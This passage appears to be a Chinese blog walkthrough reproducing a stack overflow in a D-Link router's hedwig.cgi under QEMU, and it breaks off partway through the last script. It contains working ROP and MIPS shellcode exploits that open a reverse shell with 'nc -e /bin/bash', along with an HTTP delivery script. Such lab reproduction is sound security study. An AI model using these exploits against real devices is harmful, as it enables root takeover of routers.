&#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在 Kali 虚拟机中新建一个脚本 forwarding.sh，用于开启物理机的网络地址转换（NAT）和 IP 转发（防止后续在  init.sh  脚本中启动  httpd  服务时出现问题），写入如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">sudo</span> sysctl -w net.ipv4.ip_forward=1</span><br><span class="line"><span class="built_in">sudo</span> iptables -F</span><br><span class="line"><span class="built_in">sudo</span> iptables -X</span><br><span class="line"><span class="built_in">sudo</span> iptables -t nat -F</span><br><span class="line"><span class="built_in">sudo</span> iptables -t nat -X</span><br><span class="line"><span class="built_in">sudo</span> iptables -t mangle -F</span><br><span class="line"><span class="built_in">sudo</span> iptables -t mangle -X</span><br><span class="line"><span class="built_in">sudo</span> iptables -P INPUT ACCEPT</span><br><span class="line"><span class="built_in">sudo</span> iptables -P FORWARD ACCEPT</span><br><span class="line"><span class="built_in">sudo</span> iptables -P OUTPUT ACCEPT</span><br><span class="line"><span class="built_in">sudo</span> iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span><br><span class="line"><span class="built_in">sudo</span> iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line"><span class="built_in">sudo</span> iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<p>在 Kali 中执行该脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +x forwarding.sh</span><br><span class="line">./forwarding.sh</span><br></pre></td></tr></table></figure>
+
+<p>紧接着，在路由器文件系统的根目录下，继续新建一个 init.sh 脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> squashfs-root</span><br><span class="line"><span class="built_in">cat</span> &gt; init.sh</span><br></pre></td></tr></table></figure>
+
+<p>写入如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于真机不存在地址随机化，因此这里关闭地址随机化</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制配置和二进制文件</span></span><br><span class="line"><span class="built_in">cp</span> http_conf /</span><br><span class="line"><span class="built_in">cp</span> sbin/httpd /</span><br><span class="line"><span class="built_in">cp</span> -rf htdocs/ /</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份 /etc，防止后续操作改变 /etc 文件夹中的内容导致下一次启动 QEMU 虚拟机出现问题</span></span><br><span class="line"><span class="built_in">mkdir</span> /etc_bak</span><br><span class="line"><span class="built_in">cp</span> -r /etc /etc_bak</span><br><span class="line"><span class="built_in">rm</span> /etc/services</span><br><span class="line"><span class="built_in">cp</span> -rf etc/ /</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制必要的库</span></span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc-0.9.30.1.so /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt-0.9.30.1.so /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libc.so.0 /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so.1 /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc.so.0 /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt.so.0 /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libuClibc-0.9.30.1.so /lib/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除旧的 CGI 脚本</span></span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">rm</span> -rf /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/hnap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建符号链接</span></span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据前面配置的 http_conf 文件，启动 HTTP 服务</span></span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>
+
+<p>赋予 init.sh 执行权限，并运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x init.sh</span><br><span class="line">./init.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414221136755.png"></p>
+<p>访问 <a target="_blank" rel="noopener" href="http://192.168.2.2:4321/hedwig.cgi%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0HTTP%E6%9C%8D%E5%8A%A1%E5%B7%B2%E5%BC%80%E5%90%AF%EF%BC%9A">http://192.168.2.2:4321/hedwig.cgi，可以看到HTTP服务已开启：</a></p>
+<p><img src="/./../images/image-20260414221142114.png"></p>
+<p>直接浏览器访问提示不支持的 HTTP 请求：”unsupported HTTP request”</p>
+<p>最后，在退出 QEMU 虚拟机之前，需要先创建一个  fin.sh  脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> squashfs-root</span><br><span class="line"><span class="built_in">cat</span> &gt; fin.sh</span><br></pre></td></tr></table></figure>
+
+<p>写入如下内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> -rf /etc</span><br><span class="line"><span class="built_in">mv</span> /etc_bak/etc /etc</span><br><span class="line"><span class="built_in">rm</span> -rf /etc_bak</span><br></pre></td></tr></table></figure>
+
+<p>每次退出 QEMU 虚拟机器之前，都执行一下 fin.sh 脚本，恢复刚刚 init.sh 脚本中更改过的 &#x2F;etc 文件夹，避免下一次启动 QEMU 时出现问题：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x fin.sh</span><br><span class="line">./fin.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后这里有两种方法可以来测试我们的poc是否正确</p>
+<h3 id="向-QEMU-虚拟机上传-payload"><a href="#向-QEMU-虚拟机上传-payload" class="headerlink" title="向 QEMU 虚拟机上传 payload"></a>向 QEMU 虚拟机上传 payload</h3><blockquote>
+<p>这种方式我们直接将 payload 写入文件，然后上传到 QEMU 虚拟机，通过设置环境变量来读取 payload 作为  uid，从而触发漏洞反弹 shell</p>
+</blockquote>
+<p>先把本地的gdbserver传上去</p>
+<p><img src="/./../images/image-20260414221153319.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> scp -o HostKeyAlgorithms=+ssh-rsa -r gdbserver root@192.168.2.2:~/squashfs-root/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414221158588.png"></p>
+<p><img src="/./../images/image-20260414221203614.png"></p>
+<p>在路由器文件系统里，新建一个 run.sh 脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;12&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_URI=<span class="string">&quot;2333&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;icyice=pwner&quot;</span> | ./gdbserver 127.0.0.1:6666 /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">unset</span> CONTENT_LENGTH</span><br><span class="line"><span class="built_in">unset</span> CONTENT_TYPE</span><br><span class="line"><span class="built_in">unset</span> HTTP_COOKIE</span><br><span class="line"><span class="built_in">unset</span> REQUEST_METHOD</span><br><span class="line"><span class="built_in">unset</span> REQUEST_URI</span><br></pre></td></tr></table></figure>
+
+<p>增加执行权限后运行 run.sh：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x run.sh</span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>
+
+<p>在kali里用 gdb-multiarch 远程连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote 192.168.2.2:6666</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/image-20260414221209253.png"></p>
+<p>连接成功后，在main函数下一个断点，c过去就可以通过vmmap看到libc_base&#x3D;0x77f34000：</p>
+<p><img src="/./../images/image-20260414221216497.png"></p>
+<ol>
+<li>纯 ROP 链，构造 system(“&#x2F;bin&#x2F;sh”) 来 getshell</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, <span class="built_in">arch</span> = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cmd = b<span class="string">&#x27;nc -e /bin/bash 192.168.2.1 8888&#x27;</span>   <span class="comment"># 反弹 shell</span></span><br><span class="line"> </span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"> </span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*0x3cd</span><br><span class="line">payload += p32(libc_base + 0x53200 - 1) <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + 0x169C4) <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*(4*7)</span><br><span class="line">payload += p32(libc_base + 0x32A98) <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*0x18</span><br><span class="line">payload += cmd</span><br><span class="line"> </span><br><span class="line">fd = open(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>通过 shellcode 来 getshell</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, <span class="built_in">arch</span> = <span class="string">&#x27;mips&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">libc_base = 0x77f34000</span><br><span class="line"> </span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*0x3cd</span><br><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*4</span><br><span class="line">payload += p32(libc_base + 0x436D0) <span class="comment"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*4</span><br><span class="line">payload += p32(libc_base + 0x56BD0) <span class="comment"># s3  sleep</span></span><br><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*(4*5)</span><br><span class="line">payload += p32(libc_base + 0x57E50) <span class="comment"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class="line"> </span><br><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*0x18</span><br><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*(4*4)</span><br><span class="line">payload += p32(libc_base + 0x37E6C) <span class="comment"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class="line">payload += p32(libc_base + 0x3B974) <span class="comment"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a0, $zero, 0x1111</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4006</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFFD</span></span><br><span class="line"><span class="string">    not $a0, $t4</span></span><br><span class="line"><span class="string">    not $a1, $t4</span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4183</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    andi $a0, $v0, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">    li $v0, 4041</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class="line"><span class="string">    ori $a1, 0xFF01</span></span><br><span class="line"><span class="string">    addi $a1, $a1, 0x0101</span></span><br><span class="line"><span class="string">    sw $a1, -8($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $a1, 0x0102A8C0 # IP: 192.168.2.1</span></span><br><span class="line"><span class="string">    sw $a1, -4($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    li $t4, 0xFFFFFFEF</span></span><br><span class="line"><span class="string">    not $a2, $t4</span></span><br><span class="line"><span class="string">    li $v0, 4170</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6962</span></span><br><span class="line"><span class="string">    ori $t0, $t0,0x2f2f</span></span><br><span class="line"><span class="string">    sw $t0, -20($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    lui $t0, 0x6873</span></span><br><span class="line"><span class="string">    ori $t0, 0x2f6e</span></span><br><span class="line"><span class="string">    sw $t0, -16($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a3, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    sw $a3, -12($sp)</span></span><br><span class="line"><span class="string">    sw $a3, -4($sp)</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addi $a0, $sp, -20</span></span><br><span class="line"><span class="string">    addi $t0, $sp, -20</span></span><br><span class="line"><span class="string">    sw $t0, -8($sp)</span></span><br><span class="line"><span class="string">    addi $a1, $sp, -8</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    addiu $sp, $sp, -20</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    slti $a2, $zero, 0xFFFF</span></span><br><span class="line"><span class="string">    li $v0, 4011</span></span><br><span class="line"><span class="string">    syscall 0x42424</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">payload += b<span class="string">&#x27;a&#x27;</span>*0x18</span><br><span class="line">payload += shellcode</span><br><span class="line"> </span><br><span class="line">fd = open(<span class="string">&quot;payload&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">fd.write(payload)</span><br><span class="line">fd.close()</span><br></pre></td></tr></table></figure>
+
+<p>exp中都反弹 shell，反弹的 IP 地址为宿主机 192.168.2.1，端口号为 8888</p>
+<p>为了接收反弹 shell，首先在宿主机开启一个监听：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+
+<p>两个 poc 脚本之中选择一个，在宿主机上写入 poc.py，然后执行 poc.py 生成 payload</p>
+<p>以第一个ROP的exp为例复现</p>
+<p><img src="/./../images/image-20260414221227281.png"></p>
+<p>将这个新生成的 payload 文件上传到 QEMU 虚拟机的路由器文件系统根目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> scp -o HostKeyAlgorithms=+ssh-rsa payload root@192.168.2.2:~/squashfs-root/</span><br></pre></td></tr></table></figure>
+
+<p>然后修改一下 run.sh 中的启动命令，因为我们现在不需要 gdbserver 调试了，直接启动 hedwig.cgi 即可：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_LENGTH=<span class="string">&quot;12&quot;</span></span><br><span class="line"><span class="built_in">export</span> CONTENT_TYPE=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line"><span class="built_in">export</span> HTTP_COOKIE=<span class="string">&quot;uid=`cat payload`&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_METHOD=<span class="string">&quot;POST&quot;</span></span><br><span class="line"><span class="built_in">export</span> REQUEST_URI=<span class="string">&quot;2333&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;icyice=pwner&quot;</span> | /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">unset</span> CONTENT_LENGTH</span><br><span class="line"><span class="built_in">unset</span> CONTENT_TYPE</span><br><span class="line"><span class="built_in">unset</span> HTTP_COOKIE</span><br><span class="line"><span class="built_in">unset</span> REQUEST_METHOD</span><br><span class="line"><span class="built_in">unset</span> REQUEST_URI</span><br></pre></td></tr></table></figure>
+
+<p>在 QEMU 虚拟机中运行 run.sh，然后宿主机上会显示已连接，并且可以正常使用 shell 命令查看路由器系统中的内容：</p>
+<p><img src="/./../images/image-20260414221233652.png"></p>
+<p><img src="/./../images/image-20260414221238938.png"></p>
+<p>我们就可以以 root 权限来向路由器系统任意写入文件：</p>
+<p><img src="/./../images/image-20260414221244219.png"></p>
+<p>you have been pwned！复现到了这最后一步操作，感觉一下就上来了:)</p>
+<h3 id="向-httpd-服务发送-HTTP-报文"><a href="#向-httpd-服务发送-HTTP-报文" class="headerlink" title="向 httpd 服务发送 HTTP 报文"></a>向 httpd 服务发送 HTTP 报文</h3><p>前面在 http_conf 中配置了如下内容来启动 httpd 服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Server &#123;</span><br><span class="line">    ServerName <span class="string">&quot;Linux, HTTP/1.1, &quot;</span>     <span class="comment"># 服务器的名称和协议</span></span><br><span class="line">    ServerId <span class="string">&quot;1234&quot;</span>                    <span class="comment"># 服务器的标识符</span></span><br><span class="line">    Family inet                        <span class="comment"># 使用的协议族，这里是 IPv4</span></span><br><span class="line">    Interface eth0                     <span class="comment"># 绑定的网络接口，这里是网卡 eth0</span></span><br><span class="line">    Address 192.168.2.2                <span class="comment"># qemu 的 ip 地址</span></span><br><span class="line">    Port <span class="string">&quot;4321&quot;</span>                        <span class="comment"># 对应 web 访问端口，服务器监听端口</span></span><br></pre></td></tr></table></figure>
+
+<p>于是直接向 192.168.2.2:4321 发送 HTTP 报文</p>
+<p>后面操作差不多了</p>
+<p>ROP.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;mips&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">b&#x27;nc -e /bin/bash 192.168.2.1 8888&#x27;</span>   <span class="comment"># 反弹 shell</span></span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0x77f34000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 payload</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x3cd</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x53200</span> - <span class="number">1</span>)  <span class="comment"># s0  system_addr - 1</span></span><br><span class="line">payload += p32(libc_base + <span class="number">0x169C4</span>)      <span class="comment"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">4</span> * <span class="number">7</span>)</span><br><span class="line">payload += p32(libc_base + <span class="number">0x32A98</span>)      <span class="comment"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 URL 和数据</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.2.2:4321/hedwig.cgi&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;icyice&quot;</span>: <span class="string">&quot;pwner&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义请求头</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">b&quot;uid=&quot;</span> + payload,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;12&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 POST 请求</span></span><br><span class="line">res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p>shellcode.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 